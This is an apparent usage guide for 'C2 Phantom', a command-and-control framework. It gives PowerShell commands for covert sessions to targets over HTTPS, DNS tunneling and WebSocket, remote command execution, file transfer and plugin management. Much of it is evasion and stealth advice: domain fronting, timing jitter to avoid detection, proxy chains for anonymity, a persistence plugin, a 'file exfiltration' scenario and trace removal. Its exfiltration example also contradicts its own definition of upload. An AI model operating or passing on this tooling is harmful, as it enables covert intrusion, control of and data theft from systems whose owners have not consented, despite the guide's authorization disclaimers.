# 🔮 C2 Phantom - Complete Usage Guide

## Quick Start

### 1️⃣ Activate Virtual Environment (Recommended)

```powershell
cd D:\c2-phantom
.\.venv\Scripts\Activate.ps1
```

After activation, you can use `phantom` directly instead of the full Python path.

---

## 📚 Available Commands

### ⚙️ `phantom init` - Initialize Configuration

**Purpose**: Set up C2 Phantom for first use - creates config files and generates encryption keys.

```powershell
# First time setup
phantom init

# Force reinitialize (overwrites existing config)
phantom init --force

# Use custom config path
phantom init --config C:\custom\path\config.yaml
```

**What it does:**
- ✅ Creates `~/.phantom/config.yaml` configuration file
- ✅ Generates AES-256-GCM key for symmetric encryption
- ✅ Generates RSA-4096 keypair for asymmetric encryption
- ✅ Generates ECC P-384 keypair for elliptic curve crypto
- ✅ Creates keys directory at `~/.phantom/keys/`
- ✅ Initializes plugin directory

**Output:**
```
✓ Configuration file created: C:\Users\geeth\.phantom\config.yaml
✓ AES-256-GCM key generated
✓ RSA-4096 keypair generated
✓ ECC P-384 keypair generated
✓ Plugin directory initialized
```

---

### 🔗 `phantom connect` - Connect to Target

**Purpose**: Establish a covert connection to a target system.

```powershell
# Basic HTTPS connection with default encryption
phantom connect https://target.example.com

# DNS tunneling with AES-256 encryption
phantom connect dns://target.com --protocol dns --encrypt aes256

# WebSocket with 2-second timing jitter
phantom connect wss://target.com --protocol websocket --jitter 2000

# HTTPS through proxy chain
phantom connect https://target.com --proxy socks5://proxy.example.com:1080

# Domain fronting via CDN
phantom connect https://target.com --domain-front cdn.cloudflare.com

# Custom timeout (30 seconds)
phantom connect https://target.com --timeout 30
```

**Options:**
- `--protocol` - Communication protocol:
  - `https` (default) - HTTP/HTTPS covert channels
  - `dns` - DNS tunneling via TXT records
  - `websocket` - WebSocket bidirectional connection
  
- `--encrypt` - Encryption method:
  - `aes256` (default) - AES-256-GCM symmetric encryption
  - `rsa` - RSA-4096 asymmetric encryption
  - `ecc` - Elliptic Curve (P-384) encryption
  
- `--proxy TEXT` - Use proxy server (supports HTTP, HTTPS, SOCKS5)
- `--domain-front TEXT` - Domain fronting target for traffic masking
- `--jitter INTEGER` - Random timing delay in milliseconds (default: 1000)
- `--timeout INTEGER` - Connection timeout in seconds (default: 30)

---

### 📋 `phantom list` - List Sessions

**Purpose**: Display all active/inactive sessions and connections.

```powershell
# List all sessions
phantom list

# List only active sessions
phantom list --status active

# List inactive sessions
phantom list --status inactive

# Show verbose details
phantom list --verbose

# Output as JSON
phantom list --format json

# Output as YAML
phantom list --format yaml

# Output as table (default)
phantom list --format table
```

**Example Output:**
```
┌─────────────┬──────────────────────┬──────────┬─────────────┬───────────┐
│ Session ID  │ Target               │ Protocol │ Encryption  │ Status    │
├─────────────┼──────────────────────┼──────────┼─────────────┼───────────┤
│ sess_001    │ 192.168.1.100:443    │ HTTPS    │ AES-256-GCM │ Active    │
│ sess_002    │ target.example.com   │ DNS      │ RSA-4096    │ Active    │
│ sess_003    │ 10.0.0.50:8443       │ WebSocket│ ECC-P384    │ Idle      │
└─────────────┴──────────────────────┴──────────┴─────────────┴───────────┘
```

---

### 📤 `phantom upload` - Upload Files

**Purpose**: Transfer files from local system to target.

```powershell
# Basic upload
phantom upload C:\local\file.txt /remote/path/file.txt --session sess_001

# Upload with encryption
phantom upload C:\data\report.pdf /tmp/report.pdf --session sess_001 --encrypt

# Upload with progress bar
phantom upload C:\large\file.zip /opt/file.zip --session sess_001 --progress

# Upload with custom chunk size (512 KB)
phantom upload C:\file.bin /tmp/file.bin --session sess_001 --chunk-size 512

# Upload entire directory (recursive)
phantom upload C:\folder\ /remote/folder/ --session sess_001 --recursive
```

**Options:**
- `--session TEXT` - Session ID (required) - get from `phantom list`
- `--encrypt` - Encrypt file during transfer
- `--progress` - Show upload progress bar
- `--chunk-size INT` - Upload chunk size in KB (default: 1024)
- `--recursive` - Upload directories recursively

---

### ⚡ `phantom execute` - Execute Commands

**Purpose**: Run commands on target systems.

```powershell
# Execute single command
phantom execute "whoami" --session sess_001 --output

# Execute and show output
phantom execute "hostname" --session sess_001 --output

# Execute with timeout (60 seconds)
phantom execute "long-script.ps1" --session sess_001 --timeout 60 --output

# Execute asynchronously (don't wait for completion)
phantom execute "background-task.py" --session sess_001 --async

# Execute PowerShell command
phantom execute "Get-Process" --session sess_001 --output

# Execute with parameters
phantom execute "dir C:\Users" --session sess_001 --output
```

**Options:**
- `--session TEXT` - Session ID (required)
- `--output` - Display command output
- `--timeout INT` - Execution timeout in seconds (default: 30)
- `--async` - Execute asynchronously (background)

**Security Note:** Commands execute with the permissions of the target agent.

---

### 🔌 `phantom plugin` - Manage Plugins

**Purpose**: Extend C2 Phantom functionality with custom plugins.

```powershell
# List all available plugins
phantom plugin list

# Show plugin information
phantom plugin info example

# Install plugin from repository
phantom plugin install persistence-toolkit

# Reload plugin (hot-reload without restart)
phantom plugin reload example

# Remove/uninstall plugin
phantom plugin remove old-plugin
```

**Plugin Directory:** `~/.phantom/plugins/`

**Creating Custom Plugins:**

1. Create a Python file in `~/.phantom/plugins/my_plugin.py`:

```python
from c2_phantom.plugins import BasePlugin

class MyPlugin(BasePlugin):
    name = "my_plugin"
    version = "1.0.0"
    description = "My custom plugin"
    author = "Your Name"
    
    def initialize(self):
        self.logger.info("Plugin loaded!")
    
    def cleanup(self):
        self.logger.info("Plugin unloaded!")
```

2. Restart phantom or use `phantom plugin reload my_plugin`

---

## 💡 Common Usage Scenarios

### Scenario 1: Basic Setup and Connection

```powershell
# 1. Initialize (first time only)
phantom init

# 2. Connect to target
phantom connect https://192.168.1.100:443 --encrypt aes256

# 3. List active sessions
phantom list

# 4. Execute command
phantom execute "hostname" --session sess_001 --output
```

### Scenario 2: Stealthy DNS Tunneling

```powershell
# Connect via DNS with timing jitter
phantom connect dns://target.company.com \
  --protocol dns \
  --encrypt ecc \
  --jitter 3000

# Check connection
phantom list --status active
```

### Scenario 3: File Exfiltration

```powershell
# Upload sensitive file
phantom upload C:\sensitive\data.db /tmp/data.db \
  --session sess_001 \
  --encrypt \
  --progress
```

### Scenario 4: Using Proxy Chain

```powershell
# Connect through SOCKS5 proxy
phantom connect https://target.com \
  --proxy socks5://proxy1.example.com:1080 \
  --encrypt aes256 \
  --jitter 2000
```

### Scenario 5: Domain Fronting for Evasion

```powershell
# Use CDN for traffic masking
phantom connect https://actual-target.com \
  --domain-front cdn.cloudflare.com \
  --protocol https \
  --encrypt aes256
```

---

## 🛠️ Advanced Usage

### Configuration File

Edit `~/.phantom/config.yaml`:

```yaml
# Server Configuration
server:
  host: 0.0.0.0
  port: 443
  tls_enabled: true

# Encryption Settings
encryption:
  default_algorithm: aes256-gcm
  key_size: 256
  
# Network Configuration
network:
  protocols:
    - https
    - dns
    - websocket
  timing:
    jitter_min: 500
    jitter_max: 2000

# Evasion Techniques
evasion:
  domain_fronting: true
  payload_fragmentation: true
```

### Environment Variables

```powershell
# Set custom config path
$env:PHANTOM_CONFIG = "C:\custom\config.yaml"

# Set log level
$env:PHANTOM_LOG_LEVEL = "DEBUG"

# Set default encryption
$env:PHANTOM_ENCRYPT_DEFAULT = "aes256"
```

### Logging

Logs are stored at: `~/.phantom/logs/phantom.log`

```powershell
# View logs
Get-Content ~\.phantom\logs\phantom.log -Tail 50

# Follow logs in real-time
Get-Content ~\.phantom\logs\phantom.log -Wait
```

---

## 🔒 Security Best Practices

### ⚠️ **CRITICAL WARNINGS**

1. **Authorization Required**: ALWAYS obtain written authorization before testing
2. **Legal Compliance**: Use only on systems you own or have permission to test
3. **Data Protection**: Encrypt all communications (use `--encrypt` flag)
4. **Operational Security**: Use VPN/proxy chains for anonymity
5. **Key Management**: Protect your `~/.phantom/keys/` directory
6. **Clean Up**: Remove all traces after testing is complete

### Recommended Practices

```powershell
# ✅ Good: Always use encryption
phantom connect https://target.com --encrypt aes256

# ✅ Good: Use timing jitter to evade detection
phantom connect https://target.com --jitter 2000

# ✅ Good: Use proxy chains for anonymity
phantom connect https://target.com --proxy socks5://proxy:1080

# ❌ Bad: Unencrypted connection
phantom connect http://target.com

# ❌ Bad: No timing obfuscation
phantom connect https://target.com --jitter 0
```

---

## 🧪 Testing & Development

### Run Tests

```powershell
# Activate venv first
.\.venv\Scripts\Activate.ps1

# Run all tests
pytest

# Run with coverage
pytest --cov=c2_phantom --cov-report=html

# Run specific test
pytest tests/test_encryption.py -v
```

### Code Quality

```powershell
# Format code
black c2_phantom/

# Sort imports
isort c2_phantom/

# Type checking
mypy c2_phantom/

# Linting
flake8 c2_phantom/
```

---

## 📖 Getting Help

### Command-Specific Help

```powershell
phantom --help              # Main help
phantom connect --help      # Connect command help
phantom execute --help      # Execute command help
phantom upload --help       # Upload command help
phantom list --help         # List command help
phantom plugin --help       # Plugin command help
```

### Resources

- 📚 **Full Documentation**: See `README.md`
- 🐛 **Report Issues**: https://github.com/4fqr/c2-phantom/issues
- 💬 **Discussions**: https://github.com/4fqr/c2-phantom/discussions
- 📖 **API Docs**: See `docs/` directory

---

## 🎯 Quick Reference

| Command | Purpose | Example |
|---------|---------|---------|
| `init` | Setup C2 | `phantom init` |
| `connect` | Connect to target | `phantom connect https://target.com` |
| `list` | Show sessions | `phantom list --status active` |
| `upload` | Send file | `phantom upload file.txt /tmp/file.txt --session sess_001` |
| `execute` | Run command | `phantom execute "whoami" --session sess_001 --output` |
| `plugin` | Manage plugins | `phantom plugin list` |

---

## 🚀 You're Ready!

Start with `phantom init` and explore from there. Use `--help` on any command for detailed options.

**Remember**: Always obtain proper authorization and comply with all applicable laws! 🔒
